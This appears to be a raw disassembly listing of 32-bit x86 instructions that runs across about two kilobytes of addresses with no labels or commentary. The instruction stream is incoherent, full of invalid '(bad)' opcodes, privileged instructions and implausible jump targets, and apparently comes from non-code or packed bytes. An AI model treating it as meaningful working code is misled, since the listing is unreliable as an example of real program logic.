  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
